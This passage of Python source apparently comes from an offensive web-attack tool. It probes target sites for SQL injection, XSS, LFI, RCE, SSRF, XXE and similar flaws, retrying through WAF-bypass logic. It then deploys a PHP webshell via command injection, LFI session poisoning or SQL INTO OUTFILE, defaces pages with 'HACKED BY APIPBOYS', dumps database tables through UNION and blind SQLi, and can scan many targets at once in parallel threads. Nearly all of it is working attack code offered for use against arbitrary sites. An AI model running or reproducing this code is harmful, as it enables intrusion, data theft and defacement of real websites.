            headers.update(kwargs.pop('headers'))

        use_cloudscraper = self.bypass_waf and CLOUDSCRAPER_AVAILABLE and self.cloudscraper_session

        def perform_request():
            try:
                if use_cloudscraper:
                    return self.cloudscraper_session.request(method, url, timeout=CONFIG['timeout'],
                                                             headers=headers, **kwargs)
                else:
                    return self.session.request(method, url, timeout=CONFIG['timeout'],
                                                allow_redirects=True, headers=headers, **kwargs)
            except Exception as e:
                logging.error(f"Request error: {e}")
                return None

        response = perform_request()
        if response and self.waf_bypass.detect(response.text, response.headers):
            print_progress("WAF/Block detected! Retrying with bypass...", 'warning')
            for attempt in range(self.waf_bypass.max_retries):
                time.sleep(self.waf_bypass.retry_delay * (attempt + 1))
                response = perform_request()
                if response and not self.waf_bypass.detect(response.text, response.headers):
                    print_progress(f"Request succeeded on retry {attempt+1}", 'success')
                    break
            else:
                print_progress(f"Request failed after {self.waf_bypass.max_retries} retries.", 'error')
                return None

        return response

    # ---- Perbaikan: _test_payload mengembalikan (response, param) ----
    def _test_payload(self, payload, param=None, category='sqli'):
        variants = [payload]
        if self.bypass_waf:
            variants = self.waf_bypass.bypass_payload(payload, category)
        used_param = param
        for variant in variants:
            if param:
                parsed = urlparse(self.target)
                params = parse_qs(parsed.query)
                params[param] = [variant]
                test_url = f"{self.base_url}{parsed.path}?{urllib.parse.urlencode(params, doseq=True)}"
            else:
                parsed = urlparse(self.target)
                if parsed.query:
                    existing_params = parse_qs(parsed.query)
                    if existing_params:
                        first_param = list(existing_params.keys())[0]
                        params = existing_params.copy()
                        params[first_param] = [variant]
                        test_url = f"{self.base_url}{parsed.path}?{urllib.parse.urlencode(params, doseq=True)}"
                        used_param = first_param
                    else:
                        test_url = self.target + ('' if '?' in self.target else '?') + f'id={quote(variant)}'
                        used_param = 'id'
                else:
                    test_url = self.target + ('' if '?' in self.target else '?') + f'id={quote(variant)}'
                    used_param = 'id'
            r = self._request(test_url)
            if r:
                return r, used_param
        return None, used_param

    # ---------- VULNERABILITY TESTS ----------
    def test_sqli(self):
        print_progress("Testing SQL Injection...", 'progress')
        payloads = self.payloads.get('sqli', limit=500)
        found = False
        for p in payloads:
            r, used_param = self._test_payload(p, category='sqli')
            if r:
                errors = ['mysql','sql','syntax','unclosed','query','database','warning','error','line','column','table','from','SQLSTATE','MariaDB','PostgreSQL','SQLite']
                if any(err in r.text.lower() for err in errors):
                    self.vulns.append({'type':'SQLi','url':r.url,'payload':p,'evidence':'SQL error'})
                    self.sqli_vuln = {'url': r.url, 'payload': p, 'param': used_param}
                    print_progress(f"SQLi found: {r.url} (param: {used_param})", 'success')
                    found = True
                    break
                if r.status_code == 500:
                    self.vulns.append({'type':'SQLi (possible)','url':r.url,'payload':p,'evidence':'Status 500'})
                    self.sqli_vuln = {'url': r.url, 'payload': p, 'param': used_param}
                    print_progress(f"SQLi (possible) found: {r.url} (param: {used_param})", 'success')
                    found = True
                    break
        if not found:
            print_progress("Testing SQLi (time-based)...", 'progress')
            time_payloads = ["' AND SLEEP(5)--", "' OR SLEEP(5)--", "' AND BENCHMARK(5000000,MD5(1))--"]
            for p in time_payloads:
                start = time.time()
                r, used_param = self._test_payload(p, category='sqli')
                elapsed = time.time() - start
                if elapsed > 4 and r:
                    self.vulns.append({'type':'SQLi (Time-based)','url':r.url,'payload':p,'evidence':f'Delay {elapsed:.2f}s'})
                    self.sqli_vuln = {'url': r.url, 'payload': p, 'param': used_param}
                    print_progress(f"SQLi (time-based) found: {r.url} (param: {used_param})", 'success')
                    found = True
                    break
        return found

    def test_xss(self):
        print_progress("Testing XSS (reflected)...", 'progress')
        payloads = self.payloads.get('xss', limit=300)
        for p in payloads:
            r, _ = self._test_payload(p, category='xss')
            if r and p in r.text:
                self.vulns.append({'type':'XSS (Reflected)','url':r.url,'payload':p,'evidence':'Reflected'})
                print_progress(f"XSS (Reflected) found: {r.url}", 'success')
                return True
        return False

    def test_lfi(self):
        print_progress("Testing LFI...", 'progress')
        payloads = self.payloads.get('lfi', limit=300)
        for p in payloads:
            r, _ = self._test_payload(p, category='lfi')
            if r:
                indicators = ['root:x:','win.ini','base64','hosts','shadow','apache','nginx','www-data','daemon','nobody']
                if any(ind in r.text.lower() for ind in indicators):
                    self.vulns.append({'type':'LFI','url':r.url,'payload':p,'evidence':'File content'})
                    print_progress(f"LFI found: {r.url}", 'success')
                    return True
        return False

    def test_rce(self):
        print_progress("Testing RCE...", 'progress')
        payloads = self.payloads.get('rce', limit=300)
        for p in payloads:
            r, _ = self._test_payload(p, category='rce')
            if r:
                outputs = ['uid=','root','user','bin','whoami','id','gid=','groups=']
                if any(out in r.text for out in outputs):
                    self.vulns.append({'type':'RCE','url':r.url,'payload':p,'evidence':'Command output'})
                    print_progress(f"RCE found: {r.url}", 'success')
                    return True
        return False

    def test_ssrf(self):
        print_progress("Testing SSRF...", 'progress')
        payloads = self.payloads.get('ssrf', limit=300)
        for p in payloads:
            r, _ = self._test_payload(p, category='ssrf')
            if r:
                ips = ['127.0.0.1','localhost','169.254.169.254','0.0.0.0','::1']
                if any(ip in r.text for ip in ips):
                    self.vulns.append({'type':'SSRF','url':r.url,'payload':p,'evidence':'Internal IP'})
                    print_progress(f"SSRF found: {r.url}", 'success')
                    return True
        return False

    def test_xxe(self):
        print_progress("Testing XXE...", 'progress')
        content_types = ['application/xml', 'text/xml', 'application/xml+rss']
        for ct in content_types:
            for p in self.payloads.get('xxe', limit=300):
                r = self._request(self.target, method='POST', data=p, headers={'Content-Type': ct})
                if r:
                    indicators = ['root','passwd','hosts','shadow','win.ini','config','database']
                    if any(ind in r.text.lower() for ind in indicators):
                        self.vulns.append({'type':'XXE','url':self.target,'payload':p,'evidence':'File content'})
                        print_progress(f"XXE found: {self.target}", 'success')
                        return True
        return False

    def test_nosqli(self):
        print_progress("Testing NoSQLi...", 'progress')
        payloads = self.payloads.get('nosqli', limit=300)
        for p in payloads:
            r, _ = self._test_payload(p, category='nosqli')
            if r:
                keywords = ['$ne','$gt','$lt','$in','$or','$and','$regex','$where','mongodb']
                if any(kw in r.text.lower() for kw in keywords):
                    self.vulns.append({'type':'NoSQLi','url':r.url,'payload':p,'evidence':'NoSQL syntax'})
                    print_progress(f"NoSQLi found: {r.url}", 'success')
                    return True
        return False

    def test_ssti(self):
        print_progress("Testing SSTI...", 'progress')
        payloads = self.payloads.get('ssti', limit=300)
        for p in payloads:
            r, _ = self._test_payload(p, category='ssti')
            if r:
                if any(kw in r.text for kw in ['49','config','subclasses','self','request','7*7']):
                    self.vulns.append({'type':'SSTI','url':r.url,'payload':p,'evidence':'Template output'})
                    print_progress(f"SSTI found: {r.url}", 'success')
                    return True
        return False

    def test_cmd_injection(self):
        print_progress("Testing Command Injection...", 'progress')
        payloads = self.payloads.get('cmd_injection', limit=300)
        for p in payloads:
            r, _ = self._test_payload(p, category='cmd_injection')
            if r:
                outputs = ['uid=','root','user','whoami','id','gid=','groups=']
                if any(out in r.text for out in outputs):
                    self.vulns.append({'type':'Command Injection','url':r.url,'payload':p,'evidence':'Command output'})
                    print_progress(f"Command Injection found: {r.url}", 'success')
                    return True
        return False

    def test_ldap(self):
        print_progress("Testing LDAP...", 'progress')
        payloads = self.payloads.get('ldap', limit=100)
        for p in payloads:
            r, _ = self._test_payload(p, category='ldap')
            if r and ('uid' in r.text or 'dn' in r.text or 'cn' in r.text):
                self.vulns.append({'type':'LDAP','url':r.url,'payload':p,'evidence':'LDAP response'})
                print_progress(f"LDAP found: {r.url}", 'success')
                return True
        return False

    def test_open_redirect(self):
        print_progress("Testing Open Redirect...", 'progress')
        payloads = self.payloads.get('open_redirect', limit=100)
        for p in payloads:
            r, _ = self._test_payload(p, category='open_redirect')
            if r and r.url != self.target and 'http' in r.url:
                self.vulns.append({'type':'Open Redirect','url':r.url,'payload':p,'evidence':'Redirected'})
                print_progress(f"Open Redirect found: {r.url}", 'success')
                return True
        return False

    def test_csrf(self):
        print_progress("Testing CSRF...", 'progress')
        r = self._request(self.target)
        if r:
            forms = re.findall(r'<form[^>]*>', r.text)
            for form in forms:
                if 'token' not in form.lower() and 'csrf' not in form.lower():
                    self.vulns.append({'type':'CSRF','url':self.target,'payload':'No CSRF token','evidence':'Form without token'})
                    print_progress(f"CSRF found: {self.target}", 'success')
                    return True
            if 'X-CSRF-Token' not in r.headers and 'CSRF-Token' not in r.headers:
                self.vulns.append({'type':'CSRF','url':self.target,'payload':'Missing CSRF header','evidence':'No CSRF header'})
                print_progress(f"CSRF (header) found: {self.target}", 'success')
                return True
        return False

    def test_file_upload(self):
        print_progress("Testing File Upload...", 'progress')
        endpoints = ['/upload','/upload.php','/uploads','/fileupload','/uploadfile','/upload_file','/uploader','/upload.php?act=upload','/admin/upload','/api/upload','/v1/upload','/media/upload']
        dirs = self.payloads.get('directories', [])
        for d in dirs:
            if any(key in d for key in ['upload', 'file', 'image', 'media']):
                endpoints.append(f"/{d}")
                endpoints.append(f"/{d}/upload")
        endpoints = list(set(endpoints))
        for endpoint in endpoints:
            test_url = urljoin(self.base_url, endpoint)
            for fname in self.payloads.get('file_upload', limit=30):
                files = {'file': (fname, '<?php system($_GET["cmd"]); ?>')}
                try:
                    r = self._request(test_url, method='POST', files=files)
                    if r and r.status_code in [200,201,202,302]:
                        self.vulns.append({'type':'File Upload','url':test_url,'payload':fname,'evidence':'Upload success'})
                        print_progress(f"File Upload found: {test_url}", 'success')
                        return True
                except Exception:
                    pass
        return False

    def test_directory_traversal(self):
        print_progress("Testing Directory Traversal...", 'progress')
        for d in self.payloads.get('directories', limit=100):
            test_url = urljoin(self.base_url, d + '/')
            r = self._request(test_url)
            if r and r.status_code == 200:
                self.vulns.append({'type':'Directory Listing','url':test_url,'payload':d,'evidence':'Directory accessible'})
                print_progress(f"Directory Listing found: {test_url}", 'success')
                return True
        return False

    # ---------- DUMP DATA SQLi ----------
    def dump_sqli_data(self):
        if not self.sqli_vuln:
            print_progress("No SQLi vulnerability found to dump.", 'error')
            return
        print_section("DUMPING DATA FROM SQL INJECTION")
        url = self.sqli_vuln['url']
        payload = self.sqli_vuln['payload']
        param = self.sqli_vuln.get('param', 'id')
        print_progress(f"Using payload: {payload} on parameter: {param}", 'info')

        def send_payload(payload):
            r, _ = self._test_payload(payload, param=param, category='sqli')
            return r

        # Deteksi jumlah kolom
        for i in range(1, 20):
            test_payload = f"' UNION SELECT {','.join(['NULL']*i)}-- -"
            r = send_payload(test_payload)
            if r and ('NULL' in r.text or r.status_code == 200):
                cols = i
                print_progress(f"Found {cols} columns.", 'success')
                break
        else:
            print_progress("Could not determine column count. Trying blind dump...", 'warning')
            db_payload = f"' AND SUBSTRING(database(),1,1)='a'-- -"
            r = send_payload(db_payload)
            if r and r.status_code == 200:
                print_progress("Blind SQLi detected. Dumping database name...", 'progress')
                db_name = ""
                for pos in range(1, 20):
                    found = False
                    for c in "abcdefghijklmnopqrstuvwxyz0123456789_":
                        bp = f"' AND SUBSTRING(database(),{pos},1)='{c}'-- -"
                        r = send_payload(bp)
                        if r and r.status_code == 200:
                            db_name += c
                            found = True
                            print(f"[+] Database char {pos}: {c}")
                            break
                    if not found:
                        break
                print_progress(f"Database: {db_name}", 'success')
                self.dump_data['database'] = db_name
            else:
                print_progress("Blind dump not successful. Please use manual techniques.", 'warning')
                return

        if 'cols' in locals() and cols > 0:
            db_payload = f"' UNION SELECT {','.join(['database()'] + ['NULL']*(cols-1))}-- -"
            r = send_payload(db_payload)
            if r:
                db_name = r.text.strip().split('\n')[0]
                print_progress(f"Database: {db_name}", 'success')
                self.dump_data['database'] = db_name

            tables_payload = f"' UNION SELECT {','.join(['table_name'] + ['NULL']*(cols-1))} FROM information_schema.tables WHERE table_schema=database()-- -"
            r = send_payload(tables_payload)
            if r:
                tables = re.findall(r'<td>(.*?)</td>', r.text)
                if not tables:
                    tables = r.text.strip().split('\n')
                print_progress(f"Tables: {', '.join(tables[:10])}", 'success')
                self.dump_data['tables'] = tables[:10]

            if tables:
                table = tables[0]
                cols_payload = f"' UNION SELECT {','.join(['column_name'] + ['NULL']*(cols-1))} FROM information_schema.columns WHERE table_name='{table}'-- -"
                r = send_payload(cols_payload)
                if r:
                    columns = re.findall(r'<td>(.*?)</td>', r.text)
                    if not columns:
                        columns = r.text.strip().split('\n')
                    print_progress(f"Columns in {table}: {', '.join(columns[:10])}", 'success')
                    self.dump_data['columns'] = columns[:10]

                    if columns:
                        col = columns[0]
                        data_payload = f"' UNION SELECT {','.join([col] + ['NULL']*(cols-1))} FROM {table} LIMIT 10-- -"
                        r = send_payload(data_payload)
                        if r:
                            data = re.findall(r'<td>(.*?)</td>', r.text)
                            if not data:
                                data = r.text.strip().split('\n')
                            print_progress(f"Data in {col}: {', '.join(data[:10])}", 'success')
                            self.dump_data['data'] = data[:10]

        output_dir = CONFIG['output_dir']
        os.makedirs(output_dir, exist_ok=True)
        dump_file = os.path.join(output_dir, f"sqli_dump_{self.domain}.json")
        with open(dump_file, 'w', encoding='utf-8') as f:
            json.dump(self.dump_data, f, indent=2)
        print_progress(f"Dump saved to {dump_file}", 'success')

    # ---------- DEEP ANALYSIS ----------
    def crawl(self, url, depth=0):
        if depth > CONFIG['max_depth'] or url in self.scanned_urls:
            return
        self.scanned_urls.add(url)
        print_progress(f"Crawling: {url} (depth {depth})", 'progress')
        r = self._request(url)
        if not r:
            return
        self.last_html = r.text
        self.deep_report = self.analyzer.analyze(url, r)
        if depth == 0:
            self.minor_vulns = MinorVulnAnalyzer(dict(r.headers), self.session.cookies.get_dict(), r.text, url).analyze()
        links = re.findall(r'<a\s+href=["\']([^"\']+)["\']', r.text)[:CONFIG['max_links']]
        for link in links:
            if link.startswith('http'):
                self.crawl(link, depth+1)
            elif link.startswith('/'):
                self.crawl(urljoin(self.base_url, link), depth+1)

    # ---------- DEEP AUDIT ----------
    def deep_audit(self):
        print_section("DEEP AUDIT - ANALISIS MENDALAM")
        print_progress("Memindai semua sudut tersembunyi...", 'progress')
        self.scanned_urls = set()
        self.crawl(self.target, depth=5)
        if not self.last_html:
            print_progress("No HTML content found. Aborting deep audit.", 'warning')
            return {}

        findings = {
            'hidden_inputs': [],
            'hidden_dirs': [],
            'js_endpoints': [],
            'api_endpoints': [],
            'comments': [],
            'forms': [],
            'uncommon_params': [],
            'debug_headers': [],
            'response_time': 0
        }

        hidden_inputs = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\']', self.last_html)
        findings['hidden_inputs'] = hidden_inputs

        comments = re.findall(r'<!--(.*?)-->', self.last_html)
        findings['comments'] = [c.strip() for c in comments if any(k in c.lower() for k in ['todo','fix','secret','password','admin','key'])]

        print_progress("Scanning hidden directories...", 'progress')
        for d in self.payloads.get('directories', limit=200):
            test_url = urljoin(self.base_url, d + '/')
            r = self._request(test_url)
            if r and r.status_code == 200:
                findings['hidden_dirs'].append(test_url)

        js_files = re.findall(r'<script[^>]*src=["\']([^"\']+\.js)["\']', self.last_html)
        for js in js_files:
            js_url = urljoin(self.target, js)
            r = self._request(js_url)
            if r:
                endpoints = re.findall(r'["\'](/api/[a-zA-Z0-9/_-]+)["\']', r.text)
                findings['js_endpoints'].extend(endpoints)

        api = re.findall(r'/api/[a-zA-Z0-9/_-]+', self.last_html)
        findings['api_endpoints'] = list(set(api + findings['js_endpoints']))

        forms = re.findall(r'<form[^>]*>', self.last_html)
        findings['forms'] = forms

        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        uncommon_keywords = ['debug', 'test', 'admin', 'hidden', 'dev', 'stage', 'backdoor', 'shell', 'cmd', 'exec', 'system']
        for key in params.keys():
            if any(k in key.lower() for k in uncommon_keywords):
                findings['uncommon_params'].append(key)
        form_inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', self.last_html)
        for inp in form_inputs:
            if any(k in inp.lower() for k in uncommon_keywords):
                findings['uncommon_params'].append(inp)
        json_matches = re.findall(r'{"([^"]+)"', self.last_html)
        for j in json_matches:
            if any(k in j.lower() for k in uncommon_keywords):
                findings['uncommon_params'].append(j)

        debug_headers = ['X-Debug', 'X-Test', 'X-Developer', 'X-Backend', 'X-Internal', 'X-Forwarded-For']
        for h in debug_headers:
            if h in self.deep_report.get('headers', {}):
                findings['debug_headers'].append(h)

        start_time = time.time()
        r = self._request(self.target)
        if r:
            findings['response_time'] = time.time() - start_time

        self.hidden_findings = findings
        self.deep_report['hidden'] = findings

        print_progress("Hidden Inputs:", 'info')
        for h in findings['hidden_inputs'][:10]:
            print(f"  - {h}")
        print_progress("Hidden Directories:", 'info')
        for d in findings['hidden_dirs'][:10]:
            print(f"  - {d}")
        print_progress("JS Endpoints:", 'info')
        for e in findings['js_endpoints'][:10]:
            print(f"  - {e}")
        print_progress("API Endpoints:", 'info')
        for e in findings['api_endpoints'][:10]:
            print(f"  - {e}")
        print_progress("Comments with clues:", 'info')
        for c in findings['comments'][:5]:
            print(f"  - {c}")
        print_progress("Uncommon Parameters:", 'info')
        for p in findings['uncommon_params']:
            print(f"  - {p}")
        print_progress("Debug Headers:", 'info')
        for h in findings['debug_headers']:
            print(f"  - {h}")
        print_progress(f"Response Time: {findings['response_time']:.3f}s", 'info')

        return findings

    # ---------- DEPLOY WEBSHELL (DIPERBAIKI) ----------
    def deploy_webshell(self):
        if not self.vulns:
            print_progress("No vuln found.", 'error')
            return
        print_section("DEPLOY WEBSHELL")
        print("[+] Choose vulnerability:")
        for i, v in enumerate(self.vulns, 1):
            print(f"  {i}. {v['type']} - {v['url'][:60]}...")
        try:
            choice = input("[?] Number: ").strip()
            if not choice.isdigit():
                print_progress("Invalid input.", 'error')
                return
            idx = int(choice) - 1
            if idx < 0 or idx >= len(self.vulns):
                print_progress("Invalid choice.", 'error')
                return
            vuln = self.vulns[idx]
        except:
            print_progress("Invalid choice.", 'error')
            return

        templates = [t for t in self.templates.templates if 'webshell' in t]
        if not templates:
            shell_code = "<?php system($_GET['cmd']); ?>"
        else:
            print("[+] Available templates:")
            for i, t in enumerate(templates, 1):
                print(f"  {i}. {t}")
            try:
                t_choice = input("[?] Choose template: ").strip()
                if not t_choice.isdigit():
                    print_progress("Invalid input.", 'error')
                    return
                t_idx = int(t_choice) - 1
                if t_idx < 0 or t_idx >= len(templates):
                    print_progress("Invalid choice.", 'error')
                    return
                shell_code = self.templates.templates[templates[t_idx]]
            except:
                shell_code = "<?php system($_GET['cmd']); ?>"

        if vuln['type'] in ['RCE', 'Command Injection']:
            params = ['cmd', 'c', 'command', 'exec', 'system', 'x']
            for param in params:
                test_url = vuln['url'] + f"&{param}=id"
                r = self._request(test_url)
                if r and ('uid=' in r.text or 'root' in r.text or 'whoami' in r.text):
                    encoded = base64.b64encode(shell_code.encode()).decode()
                    safe_encoded = encoded.replace("'", "'\\''")
                    deploy_url = vuln['url'] + f"&{param}=echo '{safe_encoded}' | base64 -d > shell.php"
                    self._request(deploy_url)
                    self.shell_url = urljoin(self.base_url, 'shell.php')
                    print_progress(f"Webshell deployed: {self.shell_url}", 'success')
                    verify_url = self.shell_url + "?cmd=echo test"
                    vr = self._request(verify_url)
                    if vr and 'test' in vr.text:
                        print_progress(f"Webshell verified: {self.shell_url}", 'success')
                    else:
                        print_progress(f"Webshell not verified, but file may exist.", 'warning')
                    return
            encoded = base64.b64encode(shell_code.encode()).decode()
            safe_encoded = encoded.replace("'", "'\\''")
            deploy_url = vuln['url'] + f"&cmd=echo '{safe_encoded}' | base64 -d > shell.php"
            self._request(deploy_url)
            self.shell_url = urljoin(self.base_url, 'shell.php')
            print_progress(f"Webshell deployed (fallback): {self.shell_url}", 'success')
            verify_url = self.shell_url + "?cmd=echo test"
            vr = self._request(verify_url)
            if vr and 'test' in vr.text:
                print_progress(f"Webshell verified: {self.shell_url}", 'success')
            else:
                print_progress(f"Webshell not verified, but file may exist.", 'warning')

        elif vuln['type'] == 'LFI':
            params = ['file', 'page', 'view', 'include', 'path', 'doc', 'template']
            for param in params:
                test_url = vuln['url'] + f"&{param}=../../../../etc/passwd"
                r = self._request(test_url)
                if r and 'root:x:' in r.text:
                    session_id = self.session.cookies.get('PHPSESSID', 'test')
                    poison = f"/tmp/sess_{session_id}"
                    encoded = base64.b64encode(shell_code.encode()).decode()
                    safe_encoded = encoded.replace("'", "'\\''")
                    deploy_url = vuln['url'] + f"&{param}={poison}&cmd=echo '{safe_encoded}' | base64 -d > /var/www/html/shell.php"
                    self._request(deploy_url)
                    self.shell_url = urljoin(self.base_url, 'shell.php')
                    print_progress(f"Webshell via LFI deployed: {self.shell_url}", 'success')
                    verify_url = self.shell_url + "?cmd=echo test"
                    vr = self._request(verify_url)
                    if vr and 'test' in vr.text:
                        print_progress(f"Webshell verified: {self.shell_url}", 'success')
                    else:
                        print_progress(f"Webshell not verified, but file may exist.", 'warning')
                    return
            session_id = self.session.cookies.get('PHPSESSID', 'test')
            poison = f"/tmp/sess_{session_id}"
            encoded = base64.b64encode(shell_code.encode()).decode()
            safe_encoded = encoded.replace("'", "'\\''")
            deploy_url = vuln['url'] + f"&file={poison}&cmd=echo '{safe_encoded}' | base64 -d > /var/www/html/shell.php"
            self._request(deploy_url)
            self.shell_url = urljoin(self.base_url, 'shell.php')
            print_progress(f"Webshell via LFI deployed (fallback): {self.shell_url}", 'success')
            verify_url = self.shell_url + "?cmd=echo test"
            vr = self._request(verify_url)
            if vr and 'test' in vr.text:
                print_progress(f"Webshell verified: {self.shell_url}", 'success')
            else:
                print_progress(f"Webshell not verified, but file may exist.", 'warning')

        elif vuln['type'] == 'SQLi':
            try:
                shell_hex = ''.join(f'{ord(c):02x}' for c in shell_code)
                deploy_url = vuln['url'] + f"' UNION SELECT 0x{shell_hex} INTO OUTFILE '/var/www/html/shell.php'-- -"
                self._request(deploy_url)
                self.shell_url = urljoin(self.base_url, 'shell.php')
                print_progress(f"Webshell via SQLi deployed: {self.shell_url}", 'success')
                verify_url = self.shell_url + "?cmd=echo test"
                vr = self._request(verify_url)
                if vr and 'test' in vr.text:
                    print_progress(f"Webshell verified: {self.shell_url}", 'success')
                else:
                    print_progress(f"Webshell not verified, but file may exist.", 'warning')
            except Exception as e:
                print_progress(f"SQLi deploy failed: {e}", 'warning')
        else:
            print_progress("Cannot deploy with this vuln type.", 'warning')

    # ---------- DEFACE ----------
    def deface_website(self):
        if not self.vulns:
            print_progress("No vuln found.", 'error')
            return
        print_section("DEFACE WEBSITE")
        print("[+] Choose vulnerability:")
        for i, v in enumerate(self.vulns, 1):
            print(f"  {i}. {v['type']} - {v['url'][:60]}...")
        try:
            choice = input("[?] Number: ").strip()
            if not choice.isdigit():
                print_progress("Invalid input.", 'error')
                return
            idx = int(choice) - 1
            if idx < 0 or idx >= len(self.vulns):
                print_progress("Invalid choice.", 'error')
                return
            vuln = self.vulns[idx]
        except:
            print_progress("Invalid choice.", 'error')
            return

        deface_templates = [t for t in self.templates.templates if 'deface' in t]
        if not deface_templates:
            deface_content = "<h1>HACKED BY APIPBOYS</h1>"
        else:
            print("[+] Available templates:")
            for i, t in enumerate(deface_templates, 1):
                print(f"  {i}. {t}")
            try:
                t_choice = input("[?] Choose template: ").strip()
                if not t_choice.isdigit():
                    print_progress("Invalid input.", 'error')
                    return
                t_idx = int(t_choice) - 1
                if t_idx < 0 or t_idx >= len(deface_templates):
                    print_progress("Invalid choice.", 'error')
                    return
                deface_content = self.templates.templates[deface_templates[t_idx]]
            except:
                deface_content = "<h1>HACKED BY APIPBOYS</h1>"

        if vuln['type'] in ['RCE', 'Command Injection']:
            params = ['cmd', 'c', 'command', 'exec', 'system', 'x']
            for param in params:
                test_url = vuln['url'] + f"&{param}=id"
                r = self._request(test_url)
                if r and ('uid=' in r.text or 'root' in r.text or 'whoami' in r.text):
                    encoded = base64.b64encode(deface_content.encode()).decode()
                    safe_encoded = encoded.replace("'", "'\\''")
                    deploy_url = vuln['url'] + f"&{param}=echo '{safe_encoded}' | base64 -d > index.html"
                    self._request(deploy_url)
                    self.deface_url = urljoin(self.base_url, 'index.html')
                    print_progress(f"Deface deployed: {self.deface_url}", 'success')
                    return
            encoded = base64.b64encode(deface_content.encode()).decode()
            safe_encoded = encoded.replace("'", "'\\''")
            deploy_url = vuln['url'] + f"&cmd=echo '{safe_encoded}' | base64 -d > index.html"
            self._request(deploy_url)
            self.deface_url = urljoin(self.base_url, 'index.html')
            print_progress(f"Deface (fallback): {self.deface_url}", 'success')
        else:
            print_progress("Deface only works with RCE or Command Injection.", 'warning')

    # ---------- GENERATE POC ----------
    def generate_poc(self):
        output_dir = CONFIG['output_dir']
        os.makedirs(output_dir, exist_ok=True)
        poc_file = os.path.join(output_dir, f"poc_{self.domain}.html")
        html = f"""
        <html><head><title>POC - {self.domain}</title></head>
        <body>
        <h1>Vulnerability Report</h1>
        <p>Target: {self.target}</p>
        <p>Scan Date: {datetime.now()}</p>
        <p>Total Major Vuln: {len(self.vulns)}</p>
        <h2>Major Vulnerabilities</h2>
        <ul>{''.join(f'<li><b>{v["type"]}</b> - {v["url"]}<br>Payload: <pre>{v["payload"]}</pre>Evidence: {v["evidence"]}</li>' for v in self.vulns)}</ul>
        <h2>Minor Vulnerabilities</h2>
        <ul>{''.join(f'<li><b>{f["type"]}</b> (Severity: {f["severity"]})<br>{f["description"]}</li>' for f in self.minor_vulns)}</ul>
        <h2>Hidden Findings</h2>
        <pre>{json.dumps(self.hidden_findings, indent=2)}</pre>
        <h2>SQLi Dump Data</h2>
        <pre>{json.dumps(self.dump_data, indent=2)}</pre>
        <p>Webshell: {self.shell_url or 'N/A'}</p>
        <p>Deface: {self.deface_url or 'N/A'}</p>
        <h2>Deep Analysis</h2>
        <pre>{json.dumps(self.deep_report, indent=2)}</pre>
        </body></html>
        """
        with open(poc_file, 'w', encoding='utf-8') as f:
            f.write(html)
        print_progress(f"POC saved: {poc_file}", 'success')

    # ---------- MENU ----------
    def display_menu(self):
        print_section("INTERACTIVE MENU")
        print("  [1] Deploy Webshell")
        print("  [2] Deface Website")
        print("  [3] Generate POC")
        print("  [4] Show Deep Analysis")
        print("  [5] Show Minor Vulnerabilities")
        print("  [6] Deep Audit (Analisis Mendalam)")
        print("  [7] Show Hidden Findings")
        print("  [8] Scan Another Target")
        print("  [9] Exit")
        print("  [10] Dump Data from SQLi (if found)")

    # ---------- RUN ----------
    def run(self):
        print(BANNER)
        print_progress(f"Target: {self.target}", 'info')

        if self.attack_category:
            desc = ATTACK_DESCRIPTIONS.get(self.attack_category)
            if desc:
                print_section("ATTACK DESCRIPTION")
                print(desc)
            else:
                print_progress(f"Unknown attack category: {self.attack_category}", 'error')
                return

        print_section("CRAWLING & ANALYSIS")
        self.crawl(self.target)

        print_section("VULNERABILITY TESTING")
        if self.attack_category:
            test_map = {
                'sqli': self.test_sqli,
                'xss': self.test_xss,
                'lfi': self.test_lfi,
                'rce': self.test_rce,
                'ssrf': self.test_ssrf,
                'xxe': self.test_xxe,
                'nosqli': self.test_nosqli,
                'ssti': self.test_ssti,
                'cmd_injection': self.test_cmd_injection,
                'ldap': self.test_ldap,
                'open_redirect': self.test_open_redirect,
                'csrf': self.test_csrf,
                'file_upload': self.test_file_upload,
                'directories': self.test_directory_traversal
            }
            test_func = test_map.get(self.attack_category)
            if test_func:
                test_func()
            else:
                print_progress(f"Unknown attack category: {self.attack_category}", 'error')
                return
        else:
            self.test_sqli()
            self.test_xss()
            self.test_lfi()
            self.test_rce()
            self.test_ssrf()
            self.test_xxe()
            self.test_nosqli()
            self.test_ssti()
            self.test_cmd_injection()
            self.test_ldap()
            self.test_open_redirect()
            self.test_csrf()
            self.test_file_upload()
            self.test_directory_traversal()

        print_progress(f"Found {len(self.vulns)} major vulnerabilities.", 'success')
        print_progress(f"Found {len(self.minor_vulns)} minor vulnerabilities.", 'info')
        if self.vulns:
            for v in self.vulns:
                print(f"  - {v['type']} @ {v['url'][:80]}...")

        if self.attack_category:
            print_progress("Attack category specified. Skipping interactive menu.", 'info')
            self.generate_poc()
            print_progress("Scan completed.", 'success')
            return

        while True:
            self.display_menu()
            opt = input("[?] Choose (1-10): ").strip()
            if opt == '1':
                self.deploy_webshell()
            elif opt == '2':
                self.deface_website()
            elif opt == '3':
                self.generate_poc()
            elif opt == '4':
                print(json.dumps(self.deep_report, indent=2))
            elif opt == '5':
                if self.minor_vulns:
                    for f in self.minor_vulns:
                        print(f"  [{f['severity']}] {f['type']}: {f['description']}")
                else:
                    print_progress("No minor vulnerabilities found.", 'info')
            elif opt == '6':
                self.deep_audit()
            elif opt == '7':
                if self.hidden_findings:
                    print(json.dumps(self.hidden_findings, indent=2))
                else:
                    print_progress("No hidden findings yet. Run Deep Audit first.", 'warning')
            elif opt == '8':
                new_target = input("[?] Enter new target URL: ").strip()
                if new_target.startswith('http'):
                    self.target = new_target
                    self.base_url = self._get_base_url()
                    self.domain = urlparse(new_target).netloc
                    self.vulns = []
                    self.minor_vulns = []
                    self.scanned_urls = set()
                    self.shell_url = None
                    self.deface_url = None
                    self.hidden_findings = {}
                    self.dump_data = {}
                    self.sqli_vuln = None
                    self.run()
                    return
                else:
                    print_progress("Invalid URL.", 'error')
            elif opt == '9':
                print_progress("Exiting...", 'info')
                break
            elif opt == '10':
                self.dump_sqli_data()
            else:
                print_progress("Invalid choice.", 'error')

        self.generate_poc()
        print_progress("Scan completed.", 'success')

# ================================================================
# MULTI-THREAD SCAN
# ================================================================
def scan_multiple(targets, threads=5, use_proxy=False, bypass_waf=False):
    pl = PayloadLoader()
    tl = TemplateLoader()
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(scan_single, t, pl, tl, use_proxy, bypass_waf): t for t in targets}
        for future in as_completed(futures):
            target = futures[future]
            try:
                future.result()
            except Exception as e:
                print_progress(f"Failed {target}: {e}", 'error')

